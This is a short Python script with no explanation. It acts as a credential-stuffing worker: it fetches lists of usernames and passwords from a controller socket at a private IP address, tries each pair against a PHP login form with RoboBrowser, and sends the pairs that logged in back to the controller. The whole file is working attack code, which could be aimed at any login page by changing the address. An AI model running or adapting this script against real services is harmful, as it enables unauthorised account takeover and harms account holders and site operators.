from socket import *
from robobrowser import RoboBrowser
from time import sleep
import re

connected = False
client_socket = socket(AF_INET, SOCK_STREAM)
while not connected:
    try:
        client_socket.connect(('192.168.0.14', 800))
        connected = True
    except:
        sleep(5)
print("conected")
users = client_socket.recv(4096).decode()
passes = client_socket.recv(4096).decode()
users = users.split("\n")
passes = passes.split("\n")
print(users, passes)
passed_emails = []
for i in users:
    temp_email = i
    temp_pass = passes[users.index(i)]
    br = RoboBrowser()
    br.open("http://192.168.0.14:8012/ntal/login.php")
    form = br.get_form()
    form['login'] = temp_email
    form['password'] = temp_pass
    check_text = "welcome " + temp_email
    br.submit_form(form)
    next_page = str(br.parsed())
    if re.search(check_text, next_page):
        passed_emails.append(i)
sdata = ""
sdata = '\n'.join(passed_emails)
sdata = sdata + "\n"
client_socket.send(sdata.encode())
print("-", sdata)
